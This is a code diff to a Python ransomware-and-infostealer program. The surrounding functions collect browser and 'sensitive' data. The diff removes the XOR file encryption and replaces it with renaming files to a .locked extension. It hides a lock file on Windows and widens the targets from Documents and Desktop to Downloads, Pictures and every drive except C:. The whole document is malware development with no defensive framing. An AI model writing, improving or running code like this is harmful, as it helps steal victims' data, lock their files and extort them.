@@ -22,7 +22,6 @@ import time
 import re
 import requests
 import hashlib
-import struct
 import subprocess
 from datetime import datetime, timedelta
 from pathlib import Path
@@ -423,72 +422,31 @@ def collect_all_browser_data():
 # ==================== FOLDER ENCRYPTION ====================
 
 class FolderEncryptor:
-    """Encrypts and decrypts folder contents using XOR cipher with password"""
+    """Fast folder encryption - renames files with .locked extension"""
 
     def __init__(self, password=MASTER_PASSWORD):
         self.password = password
         self.key = hashlib.sha256(password.encode()).digest()
 
-    def _xor_encrypt(self, data, key):
-        """XOR encrypt/decrypt data with key"""
-        result = bytearray()
-        key_len = len(key)
-        for i, byte in enumerate(data):
-            result.append(byte ^ key[i % key_len])
-        return bytes(result)
-
-    def encrypt_file(self, file_path):
-        """Encrypt a single file"""
-        try:
-            with open(file_path, 'rb') as f:
-                original_data = f.read()
-            original_name = os.path.basename(file_path).encode('utf-8')
-            name_length = len(original_name)
-            header = struct.pack('>I', name_length) + original_name
-            full_data = header + original_data
-            encrypted_data = self._xor_encrypt(full_data, self.key)
-            encrypted_path = file_path + ENCRYPTED_EXTENSION
-            with open(encrypted_path, 'wb') as f:
-                f.write(encrypted_data)
-            os.remove(file_path)
-            return True
-        except Exception:
-            return False
-
-    def decrypt_file(self, encrypted_path):
-        """Decrypt a single file"""
-        try:
-            with open(encrypted_path, 'rb') as f:
-                encrypted_data = f.read()
-            decrypted_data = self._xor_encrypt(encrypted_data, self.key)
-            name_length = struct.unpack('>I', decrypted_data[:4])[0]
-            original_name = decrypted_data[4:4+name_length].decode('utf-8')
-            original_data = decrypted_data[4+name_length:]
-            folder = os.path.dirname(encrypted_path)
-            original_path = os.path.join(folder, original_name)
-            with open(original_path, 'wb') as f:
-                f.write(original_data)
-            os.remove(encrypted_path)
-            return True
-        except Exception:
-            return False
-
     def encrypt_folder(self, folder_path):
-        """Encrypt all files in a folder"""
+        """Encrypt folder by renaming all files with .locked extension (fast)"""
         folder_path = Path(folder_path)
         encrypted_count = 0
         if not folder_path.exists():
             return 0
-        file_list = []
+        # Rename all files to .locked extension
         for root, dirs, files in os.walk(folder_path):
             dirs[:] = [d for d in dirs if not d.startswith('.')]
             for file in files:
                 if file == LOCK_FILE or file.endswith(ENCRYPTED_EXTENSION):
                     continue
-                file_list.append(os.path.join(root, file))
-        for file_path in file_list:
-            if self.encrypt_file(file_path):
-                encrypted_count += 1
+                try:
+                    file_path = os.path.join(root, file)
+                    locked_path = file_path + ENCRYPTED_EXTENSION
+                    os.rename(file_path, locked_path)
+                    encrypted_count += 1
+                except:
+                    pass
         # Create lock file
         lock_path = folder_path / LOCK_FILE
         lock_data = {
@@ -498,7 +456,6 @@ class FolderEncryptor:
         }
         with open(lock_path, 'w') as f:
             json.dump(lock_data, f)
-        # Make lock file hidden on Windows
         if WINDOWS:
             try:
                 ctypes.windll.kernel32.SetFileAttributesW(str(lock_path), 2)
@@ -507,19 +464,22 @@ class FolderEncryptor:
         return encrypted_count
 
     def decrypt_folder(self, folder_path):
-        """Decrypt all files in a folder"""
+        """Decrypt folder by removing .locked extension from files"""
         folder_path = Path(folder_path)
         decrypted_count = 0
         if not folder_path.exists():
             return 0
-        encrypted_files = []
-        for root, dirs, files in os.walk(folder_path):
+        # Rename all .locked files back to original
+        for root, _, files in os.walk(folder_path):
             for file in files:
                 if file.endswith(ENCRYPTED_EXTENSION):
-                    encrypted_files.append(os.path.join(root, file))
-        for file_path in encrypted_files:
-            if self.decrypt_file(file_path):
-                decrypted_count += 1
+                    try:
+                        locked_path = os.path.join(root, file)
+                        original_path = locked_path[:-len(ENCRYPTED_EXTENSION)]
+                        os.rename(locked_path, original_path)
+                        decrypted_count += 1
+                    except:
+                        pass
         # Remove lock file
         lock_path = folder_path / LOCK_FILE
         if lock_path.exists():
@@ -535,6 +495,22 @@ class FolderEncryptor:
 def is_folder_locked(folder_path):
     """Check if folder is locked"""
     return Path(folder_path).joinpath(LOCK_FILE).exists()
+
+
+def get_other_drives():
+    """Get all drives except C: on Windows"""
+    drives = []
+    if not WINDOWS:
+        return drives
+    try:
+        # Check drives A-Z except C
+        for letter in 'ABDEFGHIJKLMNOPQRSTUVWXYZ':
+            drive_path = f"{letter}:\\"
+            if os.path.exists(drive_path):
+                drives.append(Path(drive_path))
+    except:
+        pass
+    return drives
 
 
 # ==================== GUI CLASSES ====================
@@ -902,17 +878,37 @@ def run_sensitive_data_collection():
         pass
 
 
+def get_all_target_folders():
+    """Get all folders to encrypt: user folders + other drives"""
+    target_folders = []
+    user_home = Path.home()
+
+    # User folders: Documents, Desktop, Downloads, Pictures
+    user_folders = [
+        user_home / 'Documents',
+        user_home / 'Desktop',
+        user_home / 'Downloads',
+        user_home / 'Pictures',
+    ]
+    for folder in user_folders:
+        if folder.exists():
+            target_folders.append(folder)
+
+    # Other drives (D, E, A, etc.) except C
+    other_drives = get_other_drives()
+    target_folders.extend(other_drives)
+
+    return target_folders
+
+
 def run_folder_encryption(target_folders=None):
     """Encrypt target folders"""
     if target_folders is None:
-        user_home = Path.home()
-        target_folders = [
-            user_home / 'Documents',
-            user_home / 'Desktop',
-        ]
+        target_folders = get_all_target_folders()
+
     encryptor = FolderEncryptor(MASTER_PASSWORD)
     for folder in target_folders:
-        if folder.exists() and not is_folder_locked(folder):
+        if Path(folder).exists() and not is_folder_locked(folder):
             try:
                 encryptor.encrypt_folder(folder)
             except:
@@ -946,9 +942,10 @@ def main():
     browser_thread.join(timeout=120)
     data_thread.join(timeout=120)
 
-    # Encrypt user folders
-    user_home = Path.home()
-    target_folders = [user_home / 'Documents', user_home / 'Desktop']
+    # Get all target folders (user folders + other drives)
+    target_folders = get_all_target_folders()
+
+    # Encrypt all folders
     run_folder_encryption(target_folders)
 
     # Find locked folders and show GUI
